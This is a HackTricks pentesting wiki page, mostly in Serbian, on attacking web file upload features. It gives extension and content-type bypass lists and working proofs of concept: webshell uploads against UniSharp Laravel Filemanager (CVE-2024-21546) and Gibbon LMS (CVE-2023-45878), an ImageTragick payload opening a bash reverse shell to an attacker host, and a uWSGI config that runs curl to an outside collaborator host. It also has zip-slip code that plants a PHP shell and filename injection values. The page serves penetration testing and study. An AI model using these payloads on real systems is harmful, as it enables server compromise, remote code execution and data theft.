# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija fajlova

1. Ako se primenjuju, **proverite** prethodne ekstenzije. Takođe ih testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje validne ekstenzije pre** izvršne ekstenzije (koristite i prethodne ekstenzije):_
- _file.png.php_
- _file.png.Php5_
3. Pokušajte da dodate **specijalne karaktere na kraj.** Možete koristiti Burp da **bruteforce-ujete** sve **ascii** i **Unicode** karaktere. (_Napomena: takođe možete pokušati da koristite **prethodno** pomenute **ekstenzije**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušajte da zaobiđete zaštite **varanjem parsera ekstenzija** na server strani tehnikama kao što su **dupliranje** **ekstenzije** ili **dodavanje junk** podataka (**null** bajtova) između ekstenzija. _Takođe možete koristiti **prethodne ekstenzije** da pripremite bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodajte **još jedan sloj ekstenzija** u prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušajte da stavite **exec ekstenziju pre validne ekstenzije** i nadajte se da je server pogrešno konfigurisan. (korisno za eksploatisanje Apache misconfig-a gde će bilo šta sa ekstenzijom **_.php_**, ali **ne nužno završavajući sa .php** izvršiti kod):
- _ex: file.php.png_
7. Korišćenje **NTFS alternate data stream (ADS)** u **Windows**. U ovom slučaju biće ubacen karakter dvotačke ":" nakon zabranjene ekstenzije i pre dozvoljene. Kao rezultat, biće kreiran **prazan fajl sa zabranjenom ekstenzijom** na serveru (npr. "file.asax:.jpg”). Ovaj fajl može kasnije biti izmenjen drugim tehnikama, kao što je korišćenje njegovog short filename-a. Pattern "**::$data**” se takođe može koristiti za kreiranje ne-praznih fajlova. Dakle, dodavanje tačke nakon ovog patterna može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.”)
8. Pokušajte da prekidate limite imena fajla. Validna ekstenzija se iseče. I ostaje zlonamerni PHP. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Neki upload handler-i trimuju ili normalizuju trailing tačke iz sačuvanog imena fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možete zaobići validaciju ekstenzija tako što ćete:

- Koristiti validan image MIME i magic header (npr. PNG’s `\x89PNG\r\n\x1a\n`).
- Imenovati otpremljeni fajl sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server ukloni trailing tačku i sačuva `shell.php`, koji će se izvršiti ako je postavljen u web-servirani direktorijum (podrazumevano javno storage kao što je `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupite sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Ažurirajte unisharp/laravel-filemanager na ≥ 2.9.1.
- Primijenite stroge server-side allowlists i ponovo validirajte sačuvano ime fajla.
- Servirajte upload-ove iz non-executable lokacija.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Pronađite ranjivost koja omogućava **preimenovanje** već uploadovanog fajla (za promenu ekstenzije).
- Pronađite **Local File Inclusion** ranjivost za izvršavanje backdoora.
- **Moguće otkrivanje informacija**:
1. Upload-ujte **više puta** (i **istovremeno**) **isti fajl** sa **istim imenom**
2. Upload-ujte fajl sa **imenom** fajla ili foldera koji već **postoji**
3. Upload-ovanje fajla sa **"." , "..", or "…" as its name**. For instance, in Apache in **Windows**, if the application saves the uploaded files in "/www/uploads/" directory, the "." filename will create a file called
uploads” in the "/www/" directory.
4. Upload-ujte fajl koji se možda ne može lako obrisati kao što je **"…:.jpg"** u **NTFS**. (Windows)
5. Upload-ujte fajl u **Windows** sa **nevalidnim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Upload-ujte fajl u **Windows** koristeći **reserved** (**forbidden**) **names** such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Pokušajte takođe da **upload-ujete izvršni fajl** (.exe) ili an **.html** (manje sumnjivo) koji **će izvršiti kod** kada ga žrtva slučajno otvori.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payload-a se dešava tokom parsiranja konfiguracionog fajla. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon pada ili zbog Denial of Service napada) ili fajl mora biti podešen na automatsko ponovno učitavanje. Funkcija automatskog ponovnog učitavanja, ako je omogućena, ponovo učitava fajl u zadatim intervalima nakon otkrivanja promena.

Ključno je razumeti popustljivost načina parsiranja konfiguracionih fajlova uWSGI-a. Konkretno, pomenuti payload se može ubaciti u binarni fajl (kao što je slika ili PDF), čime se dodatno proširuje opseg potencijalne eksploatacije.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Postavite minimalni webshell i izvršavajte komande:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Beleške:
- Handler izvršava `base64_decode($_POST["img"])` nakon deljenja po `;` i `,`, zatim upisuje bajtove u `$absolutePath . '/' . $_POST['path']` bez validacije ekstenzije/tipa.
- Rezultujući kod se izvršava kao korisnik web servisa (npr. XAMPP Apache na Windows).

Reference za ovaj bug uključuju usd HeroLab advisory i NVD entry. Pogledajte odeljak References u nastavku.

## **wget File Upload/SSRF Trick**

U nekim slučajevima možete otkriti da server koristi **`wget`** za **preuzimanje fajlova** i da možete **navesti** **URL**. U tim slučajevima kod može proveravati da li je ekstenzija preuzetih fajlova u whitelist-i kako bi osigurao da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **ova provera se može zaobići.**\
Maksimalna dužina imena fajla u **linux** je **255**, međutim, **wget** skraćuje imena fajlova na **236** karaktera. Možete **download a file called "A"*232+".php"+".gif"**, ovo ime fajla će **bypass** proveru (u ovom primeru **".gif"** je **valid** ekstenzija), ali `wget` će **rename** fajl u **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u različite direktorijume

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Uprkos početnim pretpostavkama da ova postavka može štititi od OS-level command execution putem malicious file uploads, podrška za hijerarhijsku kompresiju i mogućnosti directory traversal formata ZIP arhive mogu biti iskorišćene. To omogućava napadačima da zaobiđu ograničenja i pobegnu iz sigurnih upload direktorijuma manipulisanjem funkcionalnošću dekompresije ciljne aplikacije.

Automatizovani exploit za izradu takvih fajlova je dostupan na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Pored toga, **symlink trick with evilarc** je opcija. Ako je cilj da se ciljano napadne fajl poput `/flag.txt`, treba kreirati symlink ka tom fajlu na vašem sistemu. Ovo osigurava da evilarc ne naiđe na greške tokom rada.

Ispod je primer Python koda koji se koristi za kreiranje zlonamernog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za više detalja **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kod je napisan da izvršava komande prosleđene kroz `$_REQUEST` promenljivu.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Više fajlova se kreira i zip arhiva se sastavlja koja sadrži ove fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Nazivi fajlova unutar zip-a se menjaju koristeći vi ili hex editor, menjajući "xxA" u "../" da bi se išlo kroz direktorijume.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Otpremite ovaj sadržaj sa image ekstenzijom da iskoristite ranjivost **(ImageMagick , 7.0.1-1)** (pogledajte [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ugradnja PHP Shell-a u PNG

Ugradnja PHP Shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se obično koriste za promenu veličine i ponovno uzorkovanje slika. Mogućnost da ugrađeni PHP Shell ostane neizmenjen ovim operacijama predstavlja značajnu prednost za određene slučajeve upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i potencijalne primene, nalazi se u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/).

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot fajlovi predstavljaju jedinstven alat u cybersecurity-u, ponašajući se kao kameleon koji može validno postojati u više formata fajlova istovremeno. Zanimljiv primer je [GIFAR], hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni na ovo sparivanje; kombinacije poput GIF i JS ili PPT i JS su takođe moguće.

Osnovna korisnost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje selektuju fajlove na osnovu tipa. Uobičajena praksa u raznim aplikacijama podrazumeva dozvoljavanje samo određenih tipova fajlova za upload—kao što su JPEG, GIF ili DOC—kako bi se smanjio rizik od potencijalno štetnih formata (npr. JS, PHP ili Phar fajlovi). Međutim, polyglot, prilagođavajući se strukturnim kriterijumima više tipova fajlova, može prikriveno zaobići ova ograničenja.

Uprkos svojoj prilagodljivosti, polygloti imaju ograničenja. Na primer, iako polyglot može istovremeno da sadrži PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog uploada može zavisiti od politike platforme u vezi sa ekstenzijama fajlova. Ako je sistem strogo ograničen po pitanju dozvoljenih ekstenzija, sama strukturna dvostrukost polyglota možda neće biti dovoljna da garantuje upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Otpremanje validnih JSON fajlova kao da su PDF

Kako izbeći detekciju tipa fajla uploadovanjem validnog JSON fajla čak i ako nije dozvoljeno, falsifikujući PDF fajl (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dokle god su `%PDF` magic bajtovi u prvih 1024 bajta, smatraće se validnim (pogledaj primer u postu)
- **`pdflib` library**: Ubaci lažni PDF format unutar polja JSON-a tako da biblioteka misli da je u pitanju pdf (pogledaj primer u postu)
- **`file` binary**: Može da pročita do 1048576 bajtova iz fajla. Jednostavno kreiraj JSON veći od te veličine tako da ne može da parsira sadržaj kao JSON, a zatim u okviru JSON-a ubaci početni deo stvarnog PDF-a i on će misliti da je u pitanju PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
